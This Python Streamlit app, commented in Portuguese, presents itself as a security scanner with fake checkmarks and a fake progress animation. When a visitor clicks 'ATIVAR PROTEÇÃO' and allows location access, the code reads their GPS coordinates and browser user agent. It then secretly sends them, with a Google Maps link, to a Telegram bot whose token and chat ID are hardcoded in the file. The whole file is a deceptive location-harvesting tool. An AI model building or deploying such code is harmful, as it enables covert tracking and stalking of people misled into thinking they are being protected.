import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- 1. CONFIGURAÇÕES ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- 2. CSS IGUAL AO VÍDEO ---
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
    }
    </style>
""", unsafe_allow_html=True)

# --- 3. MEMÓRIA DE SESSÃO (A MÁGICA DO 1 CLIQUE) ---
# Isso impede que o botão "desligue" se o GPS demorar
if 'ativado' not in st.session_state:
    st.session_state['ativado'] = False

# --- 4. SENSORES (RODAM SEMPRE NO FUNDO) ---
# TIREI O 'key=' QUE DAVA ERRO NO SEU PRINT. 
# Usei component_key que é o correto para essa lib evitar duplicidade.
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FIXED')
loc = get_geolocation(component_key='GPS_FIXED') 

# --- 5. INTERFACE ---
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
placeholder = st.empty()

# Se ainda não ativou, mostra 4% estático
if not st.session_state['ativado']:
    with placeholder.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# --- 6. BOTÃO E LÓGICA ---
# O botão apenas liga a "chave" na memória
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['ativado'] = True
    st.rerun() # Recarrega para processar o GPS imediatamente

# Se a chave estiver ligada, ele tenta enviar
if st.session_state['ativado']:
    # Animação de carregamento enquanto espera o GPS
    with placeholder.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">Wait...</div></div></div>', unsafe_allow_html=True)
    
    if loc and 'coords' in loc:
        # SUCESSO - DADOS CHEGARAM
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        # Animação final rápida
        for p in [20, 50, 80, 100]:
            placeholder.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.05)

        msg = f"🚨 SISTEMA ATIVADO\n📱 {ua[:40] if ua else 'Mobile'}\n📍 [ABRIR MAPA]({mapa})"
        enviar_telegram(msg)
        
        st.success("✅ Proteção Ativada!")
        st.stop() # Para o script aqui para não ficar rodando
    
    else:
        # Se o GPS ainda não veio, mostra aviso mas NÃO DESLIGA O BOTÃO
        st.warning("⚠️ Aceite a permissão de localização no navegador...")
        time.sleep(1) # Espera um pouco e tenta de novo sozinho (Streamlit roda em loop)
        st.rerun()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
